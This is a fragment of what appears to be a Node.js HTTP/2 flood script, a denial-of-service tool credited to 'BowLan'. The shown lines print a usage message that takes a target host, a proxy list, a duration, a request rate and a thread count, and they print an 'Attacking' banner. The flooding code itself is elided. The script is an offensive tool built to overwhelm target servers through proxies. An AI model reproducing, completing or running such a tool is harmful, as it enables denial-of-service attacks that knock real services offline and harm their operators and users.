...
if (process.argv.length < 8){
	console.log('	');
    console.log('		HTTPS/2 Floodv3 (HTTPS Only) | Method by BowLan '.green.bold);
	console.log('	');
    console.log('Usage: node file_name <GET/HEAD> <host> <proxies> <duration> <rate < 64> <thread < 2>	');
...
const dateObj = new Date();
	...
	console.log('	Attacking | Method-v3 By BowLan');
    setTimeout(() => {
